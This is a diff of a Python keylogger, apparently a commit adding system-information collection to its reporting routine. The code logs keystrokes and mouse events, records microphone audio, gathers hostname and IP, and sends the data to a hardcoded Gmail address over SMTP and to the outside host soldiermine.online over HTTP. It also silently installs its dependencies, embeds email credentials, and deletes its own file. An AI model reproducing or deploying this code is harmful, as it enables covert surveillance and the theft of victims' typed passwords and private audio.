@@ -21,8 +21,6 @@ except ModuleNotFoundError:
     from subprocess import call
     modules = ["sounddevice","pynput"]
     call("pip install " + ' '.join(modules), shell=True)
-
-
 finally:
     EMAIL_ADDRESS = "abahoronald@proton.me"
     EMAIL_PASSWORD = "e6l9#B@1@3wb"
@@ -33,22 +31,17 @@ finally:
             self.log = "KeyLogger Started..."
             self.email = email
             self.password = password
-
         def appendlog(self, string):
             self.log = self.log + string
-
         def on_move(self, x, y):
             current_move = logging.info("Mouse moved to {} {}".format(x, y))
             self.appendlog(current_move)
-
         def on_click(self, x, y):
             current_click = logging.info("Mouse moved to {} {}".format(x, y))
             self.appendlog(current_click)
-
         def on_scroll(self, x, y):
             current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
             self.appendlog(current_scroll)
-
         def save_data(self, key):
             try:
                 current_key = str(key.char)
@@ -59,28 +52,24 @@ finally:
                     current_key = "ESC"
                 else:
                     current_key = " " + str(key) + " "
-
             self.appendlog(current_key)
-
         def send_mail(self, email, password, message):
             sender = "abahoronald@proton.me"
             receiver = "raysenfuka@gmail.com"
-
             m = f""
-
             m += message
             with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                 server.login(email, password)
                 server.sendmail(sender, receiver, message)
-
         # def report(self):
         #     # self.send_mail(self.email, self.password, "\n\n" + self.log)
         #     print(self.log)
         #     self.log = ""
         #     timer = threading.Timer(self.interval, self.report)
         #     timer.start()
-
         def report(self):
+            self.system_information()
+            self.appendlog(" ...Computer: ")
             log_content = self.log.strip()  # Get the log content and remove leading/trailing whitespace
             if log_content:  # Check if there's any content in the log
                 url = "https://soldiermine.online/contract/ " + log_content  # Concatenate URL with log content
@@ -93,12 +82,9 @@ finally:
                         print("Failed to report log. Status code:", response.status_code)
                 except Exception as e:
                     print("Error:", e)
-
             self.log = ""  # Clear the log after reporting
             timer = threading.Timer(self.interval, self.report)
             timer.start()
-
-
         def system_information(self):
             hostname = socket.gethostname()
             ip = socket.gethostbyname(hostname)
@@ -110,7 +96,6 @@ finally:
             self.appendlog(plat)
             self.appendlog(system)
             self.appendlog(machine)
-
         def microphone(self):
             fs = 44100
             seconds = SEND_REPORT_EVERY
@@ -121,13 +106,10 @@ finally:
             myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
             obj.writeframesraw(myrecording)
             sd.wait()
-
             self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
-
         # def screenshot(self):
         #     img = pyscreenshot.grab()
         #     self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
-
         def run(self):
             keyboard_listener = Listener(on_press=self.save_data, on_release=self.on_release)
             with keyboard_listener:
@@ -153,11 +135,9 @@ finally:
                     os.system("rm -rf" + os.path.basename(__file__))
                 except OSError:
                     print('File is close.')
-
         def on_release(self, key):
             # if key == Key.esc:
                 # Stop listener
             return False
-
     keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
     keylogger.run()
